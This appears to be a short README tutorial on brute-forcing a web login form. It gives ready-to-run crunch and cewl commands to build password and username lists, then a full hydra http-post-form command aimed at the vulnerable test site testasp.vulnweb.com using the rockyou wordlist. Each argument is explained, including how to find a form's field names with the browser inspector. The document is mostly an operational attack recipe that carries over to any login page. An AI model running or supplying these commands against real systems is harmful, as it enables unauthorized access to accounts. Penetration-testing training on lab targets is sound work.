# hydra-Brute-Force-Attack
Hydra Brute-Force Password Attack

Create a password list using custom words or patterns using CRUNCH<br>
<pre>crunch 6 8 abc123! passwords.txt</pre>
breakdown:<br>
crunch -> Tool<br>
6 -> Minimum Character<br>
8 -> Maximum Character<br>
abc123! -> custom word<br>
passwords.txt -> filename where words are stored<br>
<br>

create a username list from website using CEWL<br>
<pre>cewl -d 2 -w user.txt http://testasp.vulnweb.com</pre>
Breakdown:<br>
cewl -> Tool<br>
-d 2 -> Depth of two links<br>
-w -> Wordlist<br>
user.txt -> Filename<br>
http://testasp.vulnweb.com -> Website URL<br>
<br>

Brute-Force Attack using HYDRA
<pre>hydra -l Admin123 -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp:tfUName=^USER^&tfUPass=^PASS^&Login=Login:Invalid Login" -V</pre>
Breakdown:<br>
hydra -> Tool<br>
-l -> username (If Known) - If not known then -L with word.txt
Admin123 -> known Username
-P -> Password list
/usr/share/wordlists/rockyou.txt or pass.txt you made earlier throughh crunch.
testasp.vulnweb.com -> Target website
http-post-form -> Form using POST method
/Login.asp: -> Login page of the target website
tfUName -> usernmae field (You may find using inspect elements of the browser and selecting username field you may find HTML tag property name=tfUName)
&tfUPass -> password field (You may find using inspect elements of the browser and selecting password field you may find HTML tag property name=tfUPass)
&Login=Login: -> For Login button
Invalid Login -> Check for the login error message when entering wrong password therefore hydra keeps trying to attempt until login is successful and invalid login is not thrown back.
-V - Verbose 
